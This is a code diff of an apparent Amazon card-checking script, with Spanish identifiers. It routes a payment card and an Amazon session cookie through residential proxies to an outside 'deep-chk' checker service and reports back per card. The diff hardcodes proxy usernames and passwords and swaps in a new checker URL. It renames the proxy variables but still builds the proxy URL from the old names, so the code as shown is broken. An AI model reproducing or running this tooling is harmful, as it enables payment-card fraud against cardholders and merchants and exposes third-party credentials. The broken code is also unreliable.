@@ -5,10 +5,10 @@ def procesar_tarjeta_amazon(card, cookie):
     session = requests.Session()
 
     # Proxy settings
-    usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
-    contraseña = "Saiper123"
-    host = "us.resiproxies.net"
-    puerto = "16666"
+    proxy_user = "package-312117-country-mx-isp-altan+redes, s.a.p.i. de c. v."
+    proxy_pass = "szwE7mwH0J5yF983"
+    proxy_host = "proxy.soax.com"
+    proxy_port = 5000
 
     proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"
 
@@ -17,7 +17,7 @@ def procesar_tarjeta_amazon(card, cookie):
         "https": proxy_url
     }
 
-    url = "https://apis-deepchk.alwaysdata.net/the-crow/Amazon.php"
+    url = "https://panel.deep-chk.com/renta-apis/the-crow/Amazon.php"
     headers = {
         'User-Agent': 'Mozilla/5.0',
         'Accept': 'application/json, text/plain, */*',
@@ -100,4 +100,5 @@ def procesar_tarjeta_amazon(card, cookie):
             "message": f"❌ Error al procesar tarjeta: {str(e)}",
             "cc": card
         }
+
 
